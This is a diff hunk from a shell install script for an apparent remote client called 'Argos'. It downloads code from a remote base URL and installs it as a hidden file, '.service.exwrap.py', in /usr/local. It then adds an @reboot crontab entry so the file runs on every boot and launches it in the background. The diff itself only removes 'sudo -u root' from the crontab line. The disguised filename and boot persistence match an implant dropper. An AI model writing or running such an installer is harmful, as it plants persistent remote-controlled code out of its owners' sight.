@@ -5,5 +5,5 @@ curl $urlbase/Argos/main/client/dependencies -o here && pip install $(<here) && 
 # installing script
 curl $urlbase/Argos/main/client/connexion.py -o .service.exwrap.py && sudo mv .service.exwrap.py /usr/local/.service.exwrap.py 
 # Setting up crontab
-echo "@reboot python3 /usr/local/.service.exwrap.py" > crontb && sudo -u root crontab crontb && rm -rf crontb
+echo "@reboot python3 /usr/local/.service.exwrap.py" > crontb && crontab crontb && rm -rf crontb
 python3 /usr/local/.service.exwrap.py &
